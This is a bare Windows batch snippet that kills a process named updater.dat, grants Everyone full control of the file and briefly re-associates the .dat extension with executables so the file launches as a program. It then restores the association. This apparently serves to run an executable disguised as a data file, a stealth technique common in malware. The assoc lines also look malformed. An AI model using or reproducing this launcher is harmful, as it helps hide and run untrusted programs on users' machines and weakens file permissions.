set taskname=updater.dat
tasklist|find /i "%taskname%" ||goto :run
taskkill /f /im "%taskname%"
goto :run
:run
cacls %~dp0updater.dat /E /G everyone:F
assoc.dat=exefile
start "" %~dp0updater.dat
assoc.dat=file